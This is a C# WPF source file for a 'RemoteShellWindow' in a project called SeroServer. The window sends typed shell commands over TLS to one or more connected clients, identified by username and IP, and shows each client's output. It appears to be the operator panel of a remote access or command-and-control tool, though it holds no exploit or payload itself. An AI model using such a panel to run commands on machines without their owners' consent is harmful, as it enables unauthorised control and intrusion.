using System.Windows;
using System.Windows.Input;
using SeroServer.Data;
using SeroServer.Net;
using SeroServer.Protocol;

namespace SeroServer.UI;

public partial class RemoteShellWindow : Window
{
    private readonly TlsServer _server;
    private readonly List<ConnectedClient> _clients;

    public RemoteShellWindow(TlsServer server, List<ConnectedClient> clients)
    {
        InitializeComponent();

        _server = server;
        _clients = clients;

        if (clients.Count == 1)
            TxtTitle.Text = $"— {clients[0].Username}@{clients[0].IP} ({clients[0].Id})";
        else
            TxtTitle.Text = $"— {clients.Count} clients";

        _server.ShellOutputReceived += OnShellOutput;
        Closed += (_, _) => _server.ShellOutputReceived -= OnShellOutput;
    }

    private void OnShellOutput(string clientId, string output)
    {
        // Only show output from our target clients
        if (!_clients.Any(c => c.Id == clientId)) return;

        Dispatcher.Invoke(() =>
        {
            var prefix = _clients.Count > 1 ? $"[{clientId}] " : "";
            TxtOutput.Text += $"\n{prefix}{output}";
            OutputScroller.ScrollToEnd();
        });
    }

    private async void Send_Click(object sender, RoutedEventArgs e)
    {
        await SendCommand();
    }

    private async void TxtCommand_KeyDown(object sender, KeyEventArgs e)
    {
        if (e.Key == Key.Enter)
            await SendCommand();
    }

    private async Task SendCommand()
    {
        var cmd = TxtCommand.Text.Trim();
        if (string.IsNullOrEmpty(cmd)) return;

        TxtOutput.Text += $"\n> {cmd}";
        TxtCommand.Clear();

        var packet = new Packet
        {
            Type = PacketType.RemoteShell,
            Data = cmd
        };

        foreach (var client in _clients)
        {
            await _server.SendToClient(client.Id, packet);
        }

        OutputScroller.ScrollToEnd();
    }

    private void Window_MouseLeftButtonDown(object sender, MouseButtonEventArgs e)
    {
        if (e.LeftButton == MouseButtonState.Pressed)
            DragMove();
    }

    private void Close_Click(object sender, RoutedEventArgs e) => Close();
}
